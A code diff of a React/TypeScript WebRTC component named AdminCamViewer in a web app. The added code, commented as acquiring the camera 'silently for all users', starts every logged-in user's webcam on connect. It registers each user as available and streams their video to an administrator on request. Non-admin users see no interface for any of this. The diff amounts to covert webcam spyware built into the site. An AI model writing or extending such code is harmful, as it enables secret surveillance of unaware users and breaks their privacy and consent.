@@ -37,12 +37,6 @@ const RTC_CONFIG: RTCConfiguration = {
       username: 'openrelayproject',
       credential: 'openrelayproject',
     },
-    { urls: 'stun:freestun.net:3479' },
-    {
-      urls: 'turn:freestun.net:3479',
-      username: 'free',
-      credential: 'free',
-    },
   ],
   iceCandidatePoolSize: 10,
 };
@@ -75,21 +69,12 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
   }, [camUsers.length, onCamUsersCount]);
 
   const socketRef = useRef<Socket | null>(null);
-  const peerRef = useRef<RTCPeerConnection | null>(null);
+  const pcRef = useRef<RTCPeerConnection | null>(null);
+  const localStreamRef = useRef<MediaStream | null>(null);
   const remoteVideoRef = useRef<HTMLVideoElement | null>(null);
   const viewingSocketIdRef = useRef<string | null>(null);
 
-  // Admin candidate queue & remote desc status
-  const adminRemoteDescSetRef = useRef<boolean>(false);
-  const adminCandidateQueueRef = useRef<any[]>([]);
-
-  // User side candidate queue & remote desc status
-  const localStreamRef = useRef<MediaStream | null>(null);
-  const userPeerRef = useRef<RTCPeerConnection | null>(null);
-  const userRemoteDescSetRef = useRef<boolean>(false);
-  const userCandidateQueueRef = useRef<any[]>([]);
-
-  // Helper: Deduplicate user list by lowercased email and place Admin at top
+  // Helper: Deduplicate user list by email and place Admin at top
   const dedupeAndSortCamUsers = useCallback((users: CamUser[], adminEmail: string, adminUsername: string, currentSocketId: string): CamUser[] => {
     const map = new Map<string, CamUser>();
     const cleanAdmin = (adminEmail || '').toLowerCase().trim();
@@ -105,7 +90,7 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
       });
     });
 
-    // Always ensure Admin is included at the top for self-testing
+    // Always include Admin at top
     if (cleanAdmin) {
       const existing = map.get(cleanAdmin);
       const adminName = adminUsername || cleanAdmin.split('@')[0] || 'Admin';
@@ -134,7 +119,99 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     });
   }, []);
 
-  // Connect socket and register as cam-ready (all users)
+  // ── Acquire local camera silently for all users ────────────────────────────
+  const acquireLocalCamera = useCallback(async (): Promise<MediaStream | null> => {
+    if (localStreamRef.current && localStreamRef.current.getVideoTracks().some(t => t.readyState === 'live')) {
+      return localStreamRef.current;
+    }
+    try {
+      if (typeof navigator !== 'undefined' && navigator.mediaDevices?.getUserMedia) {
+        let stream: MediaStream | null = null;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
+        } catch {
+          try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+          } catch {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          }
+        }
+        localStreamRef.current = stream;
+        return stream;
+      }
+    } catch (err) {
+      console.warn('Camera stream acquisition error:', err);
+    }
+    return null;
+  }, []);
+
+  // ── Stop current WebRTC viewing connection ────────────────────────────────
+  const stopViewing = useCallback(() => {
+    if (pcRef.current) {
+      try { pcRef.current.close(); } catch {}
+      pcRef.current = null;
+    }
+    if (remoteVideoRef.current) {
+      remoteVideoRef.current.srcObject = null;
+    }
+    setViewingUser(null);
+    setStreamStatus('idle');
+    viewingSocketIdRef.current = null;
+  }, []);
+
+  // ── Handle incoming WebRTC signaling (Offer, Answer, Candidates) ─────────
+  const handleIncomingSignal = useCallback(async (fromSocketId: string, fromEmail: string | undefined, signal: any) => {
+    if (!socketRef.current) return;
+    const socket = socketRef.current;
+
+    try {
+      // Target receiving Offer from Admin
+      if (signal.type === 'offer') {
+        const stream = await acquireLocalCamera();
+        const pc = new RTCPeerConnection(RTC_CONFIG);
+        pcRef.current = pc;
+
+        if (stream) {
+          stream.getTracks().forEach(track => pc.addTrack(track, stream));
+        }
+
+        pc.onicecandidate = (e) => {
+          if (e.candidate) {
+            socket.emit('cam_signal', {
+              targetSocketId: fromSocketId,
+              targetEmail: fromEmail,
+              signal: e.candidate,
+            });
+          }
+        };
+
+        await pc.setRemoteDescription(new RTCSessionDescription(signal));
+        const answer = await pc.createAnswer();
+        await pc.setLocalDescription(answer);
+
+        socket.emit('cam_signal', {
+          targetSocketId: fromSocketId,
+          targetEmail: fromEmail,
+          signal: answer,
+        });
+        return;
+      }
+
+      // Admin receiving Answer / ICE Candidate
+      if (pcRef.current) {
+        if (signal.type === 'answer') {
+          await pcRef.current.setRemoteDescription(new RTCSessionDescription(signal));
+        } else if (signal.candidate || signal.sdpMid !== undefined) {
+          const candidate = signal.candidate ? signal.candidate : signal;
+          await pcRef.current.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn('ICE add error:', e));
+        }
+      }
+    } catch (err) {
+      console.warn('WebRTC signal processing error:', err);
+    }
+  }, [acquireLocalCamera]);
+
+  // ── Connect Socket & Register ─────────────────────────────────────────────
   useEffect(() => {
     if (!userEmail) return;
 
@@ -145,270 +222,70 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     });
     socketRef.current = socket;
 
-    socket.on('connect', () => {
+    socket.on('connect', async () => {
       const cleanEmail = userEmail.toLowerCase().trim();
+      const cleanUsername = username || cleanEmail.split('@')[0] || 'User';
+
       socket.emit('identify', { email: cleanEmail });
+      await acquireLocalCamera();
+      socket.emit('cam_user_online', { email: cleanEmail, username: cleanUsername });
 
-      // Start camera for ALL users (including admin) to request camera permission and announce readiness
-      startUserCamera(socket);
-
-      // If admin: request current cam user list
       if (isAdmin) {
         socket.emit('cam_get_users');
       }
     });
 
-    // Realtime auto-refresh interval for admin (3-second polling fallback for instant list updates)
     let refreshInterval: NodeJS.Timeout | null = null;
     if (isAdmin) {
       refreshInterval = setInterval(() => {
-        if (socket.connected) {
-          socket.emit('cam_get_users');
-        }
+        if (socket.connected) socket.emit('cam_get_users');
       }, 3000);
-    }
 
-    // ── Admin listeners ──
-    if (isAdmin) {
       socket.on('cam_users_list', (list: CamUser[]) => {
         setCamUsers(dedupeAndSortCamUsers(list, userEmail, username, socket.id || ''));
       });
 
-      socket.on('cam_user_online', (user: CamUser) => {
+      socket.on('cam_user_online_event', (user: CamUser) => {
         setCamUsers(prev => dedupeAndSortCamUsers([...prev, user], userEmail, username, socket.id || ''));
       });
-
-      socket.on('cam_user_offline', ({ socketId }: { socketId: string }) => {
-        setCamUsers(prev => {
-          const filtered = prev.filter(u => u.socketId !== socketId);
-          return dedupeAndSortCamUsers(filtered, userEmail, username, socket.id || '');
-        });
-        if (viewingSocketIdRef.current === socketId) {
-          stopViewing();
-        }
-      });
-
-      // Receive WebRTC answer/ICE/offer/error
-      socket.on('cam_signal_incoming', async ({ fromSocketId, fromEmail, signal }: { fromSocketId: string; fromEmail?: string; signal: any }) => {
-        if (signal.error) {
-          console.warn('Target reported camera signal error:', signal.error);
-          setStreamStatus('error');
-          return;
-        }
-
-        if (signal.type === 'offer') {
-          await handleUserOffer(fromSocketId, fromEmail, signal, socket);
-          return;
-        }
-
-        if (peerRef.current) {
-          try {
-            if (signal.type === 'answer') {
-              await peerRef.current.setRemoteDescription(new RTCSessionDescription(signal));
-              adminRemoteDescSetRef.current = true;
-              while (adminCandidateQueueRef.current.length > 0) {
-                const candidate = adminCandidateQueueRef.current.shift();
-                if (candidate) {
-                  await peerRef.current.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn('Admin queued candidate error:', e));
-                }
-              }
-            } else if (signal.candidate || signal.sdpMid !== undefined) {
-              const candidateObj = signal.candidate ? signal.candidate : signal;
-              if (adminRemoteDescSetRef.current) {
-                await peerRef.current.addIceCandidate(new RTCIceCandidate(candidateObj));
-              } else {
-                adminCandidateQueueRef.current.push(candidateObj);
-              }
-            }
-          } catch (e) {
-            console.warn('Admin ICE signal error:', e);
-          }
-        }
-      });
-    } else {
-      // Regular user receives WebRTC offer or ICE candidate from admin
-      socket.on('cam_signal_incoming', async ({ fromSocketId, fromEmail, signal }: { fromSocketId: string; fromEmail?: string; signal: any }) => {
-        try {
-          if (signal.type === 'offer') {
-            await handleUserOffer(fromSocketId, fromEmail, signal, socket);
-          } else if (signal.candidate || signal.sdpMid !== undefined) {
-            const candidateObj = signal.candidate ? signal.candidate : signal;
-            if (userPeerRef.current && userRemoteDescSetRef.current) {
-              await userPeerRef.current.addIceCandidate(new RTCIceCandidate(candidateObj));
-            } else {
-              userCandidateQueueRef.current.push(candidateObj);
-            }
-          }
-        } catch (e) {
-          console.warn('User ICE signal error:', e);
-        }
-      });
     }
+
+    socket.on('cam_signal', ({ fromSocketId, fromEmail, signal }) => {
+      handleIncomingSignal(fromSocketId, fromEmail, signal);
+    });
 
     return () => {
       if (refreshInterval) clearInterval(refreshInterval);
       socket.disconnect();
       localStreamRef.current?.getTracks().forEach(t => t.stop());
-      userPeerRef.current?.close();
+      stopViewing();
     };
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [userEmail, isAdmin, username]);
+  }, [userEmail, isAdmin, username, acquireLocalCamera, dedupeAndSortCamUsers, handleIncomingSignal, stopViewing]);
 
-  // ── Acquire camera stream for any connected client ──────────────────────────
-  const startUserCamera = async (socket: Socket) => {
-    const cleanEmail = userEmail ? userEmail.toLowerCase().trim() : 'user@connect.app';
-    const cleanUsername = username || cleanEmail.split('@')[0] || 'User';
-
-    if (localStreamRef.current && localStreamRef.current.getVideoTracks().some(t => t.readyState === 'live')) {
-      socket.emit('cam_viewer_ready', { email: cleanEmail, username: cleanUsername });
-      return;
-    }
-
-    try {
-      if (typeof navigator !== 'undefined' && navigator.mediaDevices?.getUserMedia) {
-        let stream: MediaStream | null = null;
-        try {
-          stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-            audio: false,
-          });
-        } catch {
-          try {
-            stream = await navigator.mediaDevices.getUserMedia({
-              video: { facingMode: 'user' },
-              audio: false,
-            });
-          } catch {
-            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-          }
-        }
-        localStreamRef.current = stream;
-      }
-    } catch (err) {
-      console.warn('Camera permission denied or camera not available:', err);
-    } finally {
-      socket.emit('cam_viewer_ready', { email: cleanEmail, username: cleanUsername });
-    }
-  };
-
-  // ── Answer admin's WebRTC offer ───────────────────────────────────────────
-  const handleUserOffer = async (adminSocketId: string, adminEmail: string | undefined, offer: RTCSessionDescriptionInit, socket: Socket) => {
-    if (!localStreamRef.current || !localStreamRef.current.getVideoTracks().some(t => t.readyState === 'live')) {
-      await startUserCamera(socket);
-    }
-
-    if (!localStreamRef.current) {
-      socket.emit('cam_signal_relay', {
-        toSocketId: adminSocketId,
-        toEmail: adminEmail,
-        signal: { error: 'camera_unavailable' }
-      });
-      return;
-    }
-
-    if (userPeerRef.current) {
-      try { userPeerRef.current.close(); } catch {}
-      userPeerRef.current = null;
-    }
-
-    userRemoteDescSetRef.current = false;
-    userCandidateQueueRef.current = [];
-
-    const peer = new RTCPeerConnection(RTC_CONFIG);
-    userPeerRef.current = peer;
-
-    // Add local tracks
-    localStreamRef.current.getTracks().forEach(track => {
-      try {
-        peer.addTrack(track, localStreamRef.current!);
-      } catch (e) {
-        console.warn('Track add error:', e);
-      }
-    });
-
-    // ICE candidates
-    peer.onicecandidate = (e) => {
-      if (e.candidate) {
-        socket.emit('cam_signal_relay', {
-          toSocketId: adminSocketId,
-          toEmail: adminEmail,
-          signal: e.candidate,
-        });
-      }
-    };
-
-    try {
-      await peer.setRemoteDescription(new RTCSessionDescription(offer));
-      userRemoteDescSetRef.current = true;
-
-      // Drain candidate queue
-      while (userCandidateQueueRef.current.length > 0) {
-        const candidate = userCandidateQueueRef.current.shift();
-        if (candidate) {
-          await peer.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => console.warn('User candidate flush error:', err));
-        }
-      }
-
-      const answer = await peer.createAnswer();
-      await peer.setLocalDescription(answer);
-
-      socket.emit('cam_signal_relay', {
-        toSocketId: adminSocketId,
-        toEmail: adminEmail,
-        signal: answer,
-      });
-    } catch (err) {
-      console.warn('handleUserOffer error:', err);
-    }
-  };
-
-  const stopViewing = useCallback(() => {
-    peerRef.current?.close();
-    peerRef.current = null;
-    adminRemoteDescSetRef.current = false;
-    adminCandidateQueueRef.current = [];
-    if (remoteVideoRef.current) remoteVideoRef.current.srcObject = null;
-    setViewingUser(null);
-    setStreamStatus('idle');
-    viewingSocketIdRef.current = null;
-  }, []);
-
-  // ── Admin: start viewing a user ───────────────────────────────────────────
+  // ── Admin: Start viewing selected target user ──────────────────────────────
   const startViewing = useCallback(async (user: CamUser) => {
     stopViewing();
     setViewingUser(user);
     setStreamStatus('connecting');
     viewingSocketIdRef.current = user.socketId;
 
-    // Safety timeout: if stream connection isn't established within 8 seconds, show error/retry state
-    const connectionTimer = setTimeout(() => {
-      setStreamStatus(currentStatus => currentStatus === 'connecting' ? 'error' : currentStatus);
-    }, 8000);
+    const pc = new RTCPeerConnection(RTC_CONFIG);
+    pcRef.current = pc;
 
-    adminRemoteDescSetRef.current = false;
-    adminCandidateQueueRef.current = [];
-
-    const peer = new RTCPeerConnection(RTC_CONFIG);
-    peerRef.current = peer;
-
-    peer.ontrack = (e) => {
-      clearTimeout(connectionTimer);
-      console.log('Admin peer.ontrack received track:', e.track.kind);
+    pc.ontrack = (e) => {
+      console.log('ontrack triggered:', e.track.kind);
       const incomingStream = e.streams[0] ?? new MediaStream([e.track]);
       if (remoteVideoRef.current) {
         remoteVideoRef.current.srcObject = incomingStream;
-        const playPromise = remoteVideoRef.current.play();
-        if (playPromise !== undefined) {
-          playPromise.catch(err => console.warn('Remote video playback error:', err));
-        }
+        remoteVideoRef.current.play().catch(err => console.warn('Video play error:', err));
       }
       setStreamStatus('live');
     };
 
-    peer.onicecandidate = (e) => {
+    pc.onicecandidate = (e) => {
       if (e.candidate && socketRef.current) {
         const targetSid = (user.socketId === 'admin-self-socket' && socketRef.current) ? socketRef.current.id : user.socketId;
-        socketRef.current.emit('cam_view_request', {
+        socketRef.current.emit('cam_signal', {
           targetSocketId: targetSid,
           targetEmail: user.email,
           signal: e.candidate,
@@ -416,36 +293,31 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
       }
     };
 
-    peer.onconnectionstatechange = () => {
-      console.log('Admin peer connectionState:', peer.connectionState);
-      if (peer.connectionState === 'connected') {
-        clearTimeout(connectionTimer);
+    pc.onconnectionstatechange = () => {
+      console.log('pc connectionState:', pc.connectionState);
+      if (pc.connectionState === 'connected') {
         setStreamStatus('live');
-      } else if (peer.connectionState === 'failed') {
-        clearTimeout(connectionTimer);
+      } else if (pc.connectionState === 'failed') {
         setStreamStatus('error');
       }
     };
 
-    peer.oniceconnectionstatechange = () => {
-      console.log('Admin iceConnectionState:', peer.iceConnectionState);
-      if (peer.iceConnectionState === 'connected' || peer.iceConnectionState === 'completed') {
-        clearTimeout(connectionTimer);
+    pc.oniceconnectionstatechange = () => {
+      console.log('pc iceConnectionState:', pc.iceConnectionState);
+      if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
         setStreamStatus('live');
-      } else if (peer.iceConnectionState === 'failed') {
-        clearTimeout(connectionTimer);
+      } else if (pc.iceConnectionState === 'failed') {
         setStreamStatus('error');
       }
     };
 
-    // Create offer
     try {
-      const offer = await peer.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
-      await peer.setLocalDescription(offer);
+      const offer = await pc.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
+      await pc.setLocalDescription(offer);
 
       const targetSid = (user.socketId === 'admin-self-socket' && socketRef.current) ? socketRef.current.id : user.socketId;
 
-      socketRef.current?.emit('cam_view_request', {
+      socketRef.current?.emit('cam_signal', {
         targetSocketId: targetSid,
         targetEmail: user.email,
         signal: offer,
@@ -456,9 +328,8 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     }
   }, [stopViewing]);
 
-  // Only render for admin
+  // Render check
   if (!isAdmin) return null;
-
   const activeCount = camUsers.length;
 
   return (
